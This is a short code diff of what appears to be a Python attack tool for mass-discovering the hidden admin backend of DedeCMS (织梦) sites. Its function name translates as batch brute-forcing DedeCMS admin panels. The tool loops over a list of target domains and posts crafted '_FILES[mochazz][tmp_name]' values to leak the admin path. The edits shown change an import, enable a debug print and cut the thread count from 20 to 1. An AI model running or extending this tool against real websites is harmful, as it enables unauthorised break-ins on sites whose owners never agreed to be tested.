@@ -1,6 +1,6 @@
 import itertools
 import traceback
-from 织梦 import utils
+from common import utils
 from threading import Thread
 import time
 import re
@@ -68,7 +68,7 @@ def get_back_url(domain):
                 # if pre == "my":
                 #     print("1")
                 data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=pre)
-                # print("testing", pre)
+                print("testing", pre)
                 r = utils.my_requests(target_url, method="post", data=data)
                 data["_FILES[mochazz][tmp_name]"] = up_path
                 if "Upload filetype not allow !" not in r.text and r.status_code == 200:
@@ -137,7 +137,7 @@ def 批量爆破织梦后台(t_num):
 
 if __name__ == '__main__':
     # 线程数
-    t_num = 20
+    t_num = 1
     ts = []
     domains = utils.get_lines("./target/批量爆破织梦后台")
     # 结果集
